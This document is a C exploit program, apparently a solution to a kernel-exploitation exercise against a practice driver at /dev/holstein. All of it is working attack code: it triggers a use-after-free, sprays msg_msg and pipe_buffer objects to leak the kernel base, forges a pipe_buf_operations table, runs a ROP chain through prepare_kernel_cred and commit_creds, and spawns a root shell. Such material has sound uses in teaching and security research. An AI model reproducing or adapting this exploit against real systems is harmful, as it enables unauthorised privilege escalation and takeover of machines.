#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define PAGE_SIZE   4096
#define OBJ_SIZE    1024

#define SPRAY       256

#define ops_offset  0xc11140


// push rsi; jmp qword ptr [rsi + 0x39] ; 0xffffffff8132a2aa
// pop rsp; ret ; 0xffffffff810d55b5
// add rsp, 0x68; pop r12; pop r13; pop rbp; ret; 0xffffffff811e209a

// pop rdi; ret; 0xffffffff8114078a
// pop rcx; ret; 0xffffffff810eb7e4
// mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret; 0xffffffff81638e9b

// prepare_kernel_cred = 0xffffffff81072560 
// uint64_t commit_creds = 0xffffffff810723c0
// uint64_t kpti_trampoline = 0xffffffff81800e26

#define push_rsi_jmp_rsi_0x39   (kbase + 0x32a2aa)
#define pop_rsp_ret             (kbase + 0xd55b5)
#define add_rsp_0x68_pop3_ret   (kbase + 0x1e209a)
#define pop_rdi_ret             (kbase + 0x14078a)
#define pop_rcx_ret             (kbase + 0xeb7e4)
#define mov_rdi_rax_ret         (kbase + 0x638e9b)
#define prepare_kernel_cred     (kbase + 0x72560)
#define commit_creds            (kbase + 0x723c0)
#define kpti_trampoline         (kbase + 0x800e26)

uint64_t kbase;

/* msg_msg helpers */
#define MSG_COPY    040000
#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42

typedef struct {
    long mtype;
    char mtext[0];
} msg_t;

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

int open_dev(void){
    return open("/dev/holstein", O_RDWR);
}

uint64_t user_cs, user_ss, user_sp, user_rflags;

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
        );

    puts("[+] save state");
}

void shell()
{
    printf("[+] UID: %d\n", getuid());
    puts("ROOOT awokawokawokawok");
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    execve("/bin/sh", argv, envp);    
}

int main()
{
    int fd[2] = {0};
    int qid[SPRAY];
    int tmp_qid[SPRAY];
    int pfd[SPRAY][2];
    uint8_t data[OBJ_SIZE];
    struct pipe_buffer leak;
    
    uint64_t slab_leak = 0;
    uint64_t obj_addr = 0;
    uint8_t payload[OBJ_SIZE] = {0};
    struct pipe_buf_operations *fake_ops = NULL;
    uint64_t *rop = NULL;

    save_state();
    puts("spray msg_msg for defrag kmalloc-1k");
    msg_t *msg = calloc(1, sizeof(msg_t)+1024-0x30);
    for (int i = 0; i < SPRAY; i++){
        tmp_qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        msg->mtype = MTYPE_PRIMARY;
        msgsnd(tmp_qid[i], msg, 1024-0x30, 0);
    }
    for (int i = SPRAY/2; i < SPRAY; i++){
        msgrcv(tmp_qid[i], msg, 1024-0x30, 0, 0);
    }

    puts("trigger UAF");
    fd[0] = open_dev();
    fd[1] = open_dev();
    close(fd[0]);

    puts("overlap with msg_msg");
    for (int i = 0; i < SPRAY; i++){
        qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        msg->mtype = MTYPE_PRIMARY;
        msgsnd(qid[i], msg, 1024-0x30, 0);
        msg->mtype = MTYPE_SECONDARY;
        msgsnd(qid[i], msg, 1024-0x30, 0);
    }

    memset(data,0, OBJ_SIZE);
    read(fd[1], data, OBJ_SIZE);

    slab_leak = *(uint64_t*)data;
    obj_addr = slab_leak+0x400;
    printf("[+] kmalloc-1k SLAB: 0x%016lx\n", slab_leak);
    printf("[+] UAF obj: 0x%016lx\n", obj_addr);    

    puts("[+] free msg_msg");
    for (int i = 0; i < SPRAY; i++){
        msgrcv(qid[i], msg, 1024-0x30, 0, 0);
    }

    puts("[+] overlap with pipe_buffer");
    for (int i = 0; i < SPRAY; i++){
        pipe(pfd[i]);
    }

    puts("[+] populate pipe_buffer");
    for (int i = 0; i < SPRAY; i++){
        write(pfd[i][1], "pwn", 3);
    }
    char buff[1024];
    memset(data,0, OBJ_SIZE);
    memset(buff,0, 1024);

    read(fd[1], &leak, sizeof(struct pipe_buffer));
    kbase = leak.ops - ops_offset;
    
    puts("+++++++++++++++++++++++++++++++++++");
    printf("pipe_buff.flags : %d\n" ,leak.flags);
    printf("pipe_buff.len: %d\n" ,leak.len);
    printf("pipe_buff.offset: 0x%x\n" ,leak.offset);
    printf("pipe_buff.ops: 0x%016lx\n" ,leak.ops);   
    printf("kernel base: 0x%016lx\n" ,kbase);

    puts("+++++++++++++++++++++++++++++++++++");
    puts("[*] prepare fake pipe_buffer and fake ops table");    
  

    memset(payload,0,OBJ_SIZE);
    leak.ops = obj_addr+sizeof(struct pipe_buffer);
    memcpy(payload, &leak, sizeof(struct pipe_buffer));
    fake_ops = (struct pipe_buf_operations*)&payload[sizeof(struct pipe_buffer)];
    fake_ops->release = push_rsi_jmp_rsi_0x39;

    printf("fake pipe_buff.ops: 0x%016lx\n" ,leak.ops);
    printf("fake pipe_buf_operation.release: 0x%016lx\n" ,fake_ops->release);
    

    *(uint64_t *)(payload +0x39) = pop_rsp_ret;
    *(uint64_t *)payload = add_rsp_0x68_pop3_ret;
    
    printf("fake stack: 0x%lx\n" ,*(uint64_t *)payload);

    rop = (uint64_t *)(payload + 0x88);
    *rop++ = pop_rdi_ret;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = pop_rcx_ret;
    *rop++ = 0;
    *rop++ = mov_rdi_rax_ret;
    *rop++ = commit_creds;
    *rop++ = kpti_trampoline;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (uint64_t)&shell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop++ = user_ss;


/*
    for(int i=0; i < 0x100; i++){
        printf("0x%x: 0x%016lx\n" ,i, *(uint64_t*)(payload + i));
    }
*/


    write(fd[1], payload, OBJ_SIZE);
    
    // debug();

    // Release pipes
    for (int i = 0; i < SPRAY; i++) {
        close(pfd[i][0]);
        close(pfd[i][1]);
    }    

    return EXIT_SUCCESS;

}

